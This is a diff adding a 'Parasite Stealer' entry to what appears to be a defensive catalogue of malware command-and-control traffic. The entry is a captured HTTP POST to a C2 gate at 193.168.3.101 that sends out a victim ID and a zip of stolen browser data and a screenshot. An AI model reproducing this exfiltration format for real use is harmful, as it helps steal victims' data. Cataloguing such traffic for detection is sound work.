@@ -1902,6 +1902,28 @@ Content-Type: text/html; charset=utf-8
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasitehttp.png "ParasiteHTTP Loader")
 
+#### Parasite Stealer
+~~~
+POST /gate.php HTTP/1.1
+Content-Type: application/octet-stream;
+User-Agent: Client
+Host: 193.168.3.101
+Content-Length: 1216583
+Cache-Control: no-cache
+
+{846ee340-7039-11de-9d20-806e6f6e6963}~;^;Windows 7 Professional x64~;^;1.0~;^;0~;^;0~;^;0~;^;0~;^;0~;^;8~;^;PK.........q?P..&.?.......	...about.logUT
+..m.4^m.4^m.4^.U]..@.}.	..>j6...?.J.Z7K!....0,....au..;.6u.....s...\?......J.CP...%....wz..........,#][F.p...]d...8X.`...[a... .....{.A.A.-.}....e....o]...H`.."......o3...&x+H.k......6x.tM....E.r..H....	Ls\f.....`.......].h\.....4.1..V.W%X.D.....3Y....9.u,ch......$i..Ps........J.uN.%...........y...8.QF7....	.!.........d.8...d;&.....................l.m7....w...1.3......r..	{.i.....}Lr5h.w..8eB._..w.LJp..9....+..]....T.6-..o..-f7.Q.z;...<..W.%.pA.......Q..d.o..""".-xD`)..F=..]..*..I.s0...-..P*.1.I..2N....!..\...5....IB..(O....u..Z......=....}.$.?;7Lt....)."/Y...o5.$..e....G'U....xrB..PK..........?P............	...Browsers/UT
+..`.5^`.5^`.5^PK.........q?PX.eS.P...P......Grabber.zipUT....... .......about.logUT...m.4^PK............?P............	.	..........Aw...Browsers/UT...`.5^PK...........q?PX.eS.P...P....	....... .......Grabber.zipUT...n.4^PK...........q?P.ci..:...|....	....... ....S..screen.jpegUT...m.4^PK....................
+
+HTTP/1.1 200 OK
+Date: Fri, 31 Jan 2020 21:13:48 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasite1.png "Parasite stealer")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasite2.png "Parasite stealer")
+
 #### Phoenix Keylogger
 ~~~
 220 us2.outbound.mailhostbox.com ESMTP Postfix
